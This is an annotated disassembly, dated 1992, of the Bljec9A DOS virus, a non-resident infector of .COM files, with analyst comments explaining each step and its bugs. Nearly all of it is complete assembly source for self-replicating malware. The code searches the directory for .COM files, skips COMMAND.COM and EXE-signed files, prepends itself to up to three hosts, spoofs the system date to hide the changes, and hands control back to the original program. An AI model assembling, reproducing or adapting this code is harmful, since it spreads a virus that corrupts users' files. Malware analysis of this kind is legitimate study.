

;
; The Bljec9A virus - An inserting non-resident .COM file infector
;
; Disassembly by VALENTINE MICHAEL SMITH with the help of Sourcer v3.22
;
; 7/12/92
;

IDEAL
MODEL tiny
DOSSEG

DefaultDTA  = 0080h
DTALength   = 0100h - DefaultDTA
NewDTA      = 0FFFFh - DTALength
SetupCode   = 0FFF9h
FileDateOfs = 0018h
FileSizeOfs = 001Ah
FileNameOfs = 001Eh

CODESEG

ORG 0F2h                       ; Virus uses part of DTA for data storage

Date            dw      ?      ; Storage for system day and month
Year            dw      ?      ; Storage for system year
ProgramBuffer   dw      ?      ; Storage for ptr to buffer for the program we
                               ;   are infecting
BufferStart     dw      ?      ; Storage for ptr to start of buffer
VirusLen        dw      ?      ; Storage for length of virus
FileSize        dw      ?      ; Storage for length of program we're infecting
FileNamePtr     dw      ?      ; Storage for ptr to name of file we're infecting

ORG 100h

Start:
     NOP                             ; Uses the value 9090h at first byte in
Counter:                             ;   file as an infection marker.  Also
     NOP                             ;   uses the second byte as a counter.
     mov     cx,DTALength            ; Make a copy of the current DTA so as not
     mov     si,offset DefaultDTA    ;   to screw up the original program's
     mov     di,offset NewDTA        ;   command line parameters when we look
     rep     movsb                   ;   for more programs to infect.
     mov     ax,offset OriginalProgram
     mov     cx,ax                   ;
     sub     ax,100h                 ;
     mov     [WORD VirusLen],ax      ; Store length of virus
     add     cx,[WORD ProgramLen]    ;
     mov     [WORD BufferStart],cx   ; Store offset of our buffer
     add     cx,ax                   ;
     mov     [WORD ProgramBuffer],cx ; Store offset of end of virus in buffer
     mov     cx,ax                   ;
     mov     si,offset Start         ;
     mov     di,[WORD BufferStart]   ; Make a copy of the virus in our buffer
     rep     movsb                   ;
     mov     al,3                    ; Initialize counter value.  This causes
     mov     [BYTE Counter],al       ;   the virus to only infect three files
                                     ;   at a time.
     mov     ah,2Ah                  ;
     int     21h                     ; Store the current system date in memory,
     mov     [WORD Date],dx          ;   so that we can restore it when our
     mov     [WORD Year],cx          ;   virus is finished executing.
     stc                             ; I have no fucking idea why this is here.
                                     ;   The FindFirst file function will set
                                     ;   this flag to its own value to indicate
                                     ;   whether an error occurred or not, so
                                     ;   this seemingly accomplishes nothing.
     mov     dx,offset COMFileSpec   ; Find first .COM file in the current
     mov     ah,4Eh                  ;   directory.  Includes files with
     mov     cx,00100000b            ;   archive bit set, but not hidden or
     int     21h                     ;   system files.
     or      ax,ax                   ; AX will be zero if a .COM file was found
     jz      InfectFile              ;
     jmp     ExitVirus               ; Bail out if none found.

InfectFile:
     mov     ah,2Fh                  ;
     int     21h                     ; Get current DTA address
     mov     ax,[ES:bx+FileSizeOfs]  ; Get size of file we're about to infect
     mov     [WORD FileSize],ax      ;   and store it in memory.
     add     bx,FileNameOfs          ; Calculate offset to ASCIIZ filename of
     mov     [WORD FileNamePtr],bx   ;   program we're infecting and store it.
     mov     ax,'OC'                 ; This block of code keeps the virus from
     sub     ax,[DefaultDTA + FileNameOfs]; infecting any file whose first two
     jnz     NotCOMMAND              ;   letters are "CO", including COMMAND.COM
     jmp     FindNextFile
NotCOMMAND:
     add     ax,180h                 ; This block of code was originally
     add     ax,[WORD VirusLen]      ;   intended to check whether the .COM
     add     ax,[WORD ProgramLen]    ;   file was too long to infect or not.
     cmp     ax,0FFF0h               ;   However, the above block of code
     jbe     FileSizeOK              ;   demolishes the AX register and makes
     jmp     FindNextFile            ;   this code decide which files to infect
                                     ;   based on the first two characters in
                                     ;   their filename rather than their file
                                     ;   size.
FileSizeOK:
     mov     cx,[DefaultDTA + FileDateOfs]
     and     cx,0000000000011111b    ; Mask off the day of the month from the
     mov     dl,cl                   ;   file date and store it in DL.
     mov     ax,[DefaultDTA + FileDateOfs]
     and     ax,0000000111100000b    ; Mask off the month from the file date,
     mov     cl,5                    ;   shift it over 5 bits, and store it in
     sar     ax,cl                   ;   DH.
     mov     dh,al                   ;
     mov     ax,[DefaultDTA + FileDateOfs]
     and     ax,1111111000000000b    ; Mask off the year from the file date,
     mov     cl,9                    ;   shift it over 9 bits, store it in the
     sar     ax,cl                   ;   CX register, and the value 1980 to it.
     mov     cx,ax                   ; BUG: The SAR instruction was incorrectly
     add     cx,1980                 ;   used rather than SHR.  Consequently if
                                     ;   the year on the file date is 2044 or
                                     ;   greater, the virus will attempt to set
                                     ;   the year on the system date to 64572
                                     ;   or something even more larger thus
                                     ;   thus causing an error when the DOS Set
                                     ;   System Date function call is made.
     mov     ah,2Bh                  ; Set system date to the date on the file
     int     21h                     ;   we are infecting, so that the date
                                     ;   doesn't get changed when we infect it.
                                     ;   However the time on the file WILL be
                                     ;   changed, so all this seems just a bit
                                     ;   silly.
     clc                             ; WHAT THE HELL IS THIS FOR?!?!?
     mov     ax,3D02h                ;
     mov     dx,bx                   ;
     int     21h                     ; Open file.
     mov     bx,ax                   ; Stick the file handle where it belongs.
     mov     ah,3Fh                  ;
     mov     cx,[WORD FileSize]      ; Read the file we're infecting into the
     mov     dx,[WORD ProgramBuffer] ;   buffer immediately following the virus
     int     21h                     ;   code.
     mov     bx,dx                   ;
     mov     ax,[WORD bx]            ; Check if file has already been infected

; The following block of code was is partially new code that was added to the
;   Bljec8A virus and partially rewritten code from Bljec8A.  Anyway, this code
;   is the only difference between Bljec8A and Bljec9A.

     cmp     ax,9090h                ;   by checking for our 9090h signature.
     je      FindNextFile            ; Find another file to infect if so.
     cmp     ax,'ZM'                 ; Check if first two characters in file are
     je      FindNextFile            ;   'MZ', the signature for an .EXE file.
                                     ;   Find another file to infect if they are
     mov     di,dx                   ; Set up DI and CX for our little file
     mov     cx,[WORD FileSize]      ;   scanning loop.
ScanFileLoop:
     or      cx,cx                   ; Check if we're done scanning the file.
     js      NoEXESignature          ;   Move on to rest of virus if we have.
     mov     al,'M'                  ;
     repne scasb                     ; Scan file for the character 'M'.
     jnz     NoEXESignature          ; If not found, move on and infect the file
     mov     al,'Z'                  ; See if next character after the 'M' is
     cmp     [ES:di],al              ;   'Z'.  Move on to next file if it is,
     je      FindNextFile            ;   otherwise continue scanning the file
     jmp     SHORT ScanFileLoop      ;   for more occurences.

; End of Bljec9A new code block.

NoEXESignature:
     mov     ax,[WORD FileSize]      ;
     mov     bx,[WORD ProgramBuffer] ; Store the length of the program to be
     mov     [WORD bx-2],ax          ;   infected in virus code in the buffer.
     mov     ah,3Ch                  ; Truncate the original file of the program
     mov     cx,0                    ;   we're infecting to zero length.  The
     mov     dx,[WORD FileNamePtr]   ;   author just used this instead of moving
                                     ;   the file pointer like most viruses.
     clc                             ; WHY IS THIS HERE?!?!?!
     int     21h                     ;
     mov     bx,ax                   ; Put the new file handle where it belongs.
     mov     ah,40h                  ;
     mov     cx,[WORD FileSize]      ;
     add     cx,[WORD VirusLen]      ; Copy the contents of our buffer to the
     mov     dx,[WORD BufferStart]   ;   file.
     int     21h                     ;
     mov     ah,3Eh                  ;
     int     21h                     ; Close up the file.
     dec     [BYTE counter]          ; Indicate the successful infection of one
     jz      ExitVirus               ;   file, and exit virus if we've already
                                     ;   infected three files.
FindNextFile:
     stc                             ; WHAT ARE THESE THINGS ACCOMPLISHING?!?!?
     mov     ah,4Fh                  ;
     int     21h                     ; Find next .COM file
     or      ax,ax                   ; AX will be zero if another .COM file
     jnz     ExitVirus               ;   was found.  Bail out if no more .COM
     jmp     InfectFile              ;   files found.
ExitVirus:
     mov     dx,[WORD Date]          ;
     mov     cx,[WORD Year]          ; Restore system date to what it was when
     mov     ah,2Bh                  ;   the virus started executing.
     int     21h                     ;
     mov     cx,DTALength            ;
     mov     si,offset NewDTA        ; Move our copy of the original DTA back
     mov     di,offset DefaultDTA    ;   to where it belongs in the PSP.
     rep     movsb                   ;
     mov     ax,0A4F3h               ; Set up the following code at the top of
     mov     [WORD SetupCode],ax     ;   our .COM file's 64K segment:
     mov     al,0EAh                 ;
     mov     [BYTE SetupCode + 2],al ;          rep movsb
     mov     ax,0100h                ;          jmp FAR ????h:0100h
     mov     [WORD SetupCode + 3],ax ;
     mov     si,offset OriginalProgram; Set up the pointers for copying the
     mov     di,offset Start         ;   original program back to where it
     mov     ax,cs                   ;   belongs.
     mov     [WORD SetupCode + 5],ax ; Self-modify the two JMP FAR instructions
     mov     [WORD CSValue],ax       ;   with the current value of CS.
     mov     cx,[WORD ProgramLen]    ; More setup for the REP MOVSB instruction

          db     0EAh                ; JMP FAR opcode
          dw     offset SetupCode    ;
CSValue   dw     0000h               ; Pointer for self-modifying code.  The
                                     ;   value of CS will be stored here at
                                     ;   run-time.

COMFileSpec     db      '*?.com',0
ProgramLen      dw      OriginalProgramLen

OriginalProgram:
     int     20h

OriginalProgramLen = $ - OriginalProgram

END Start

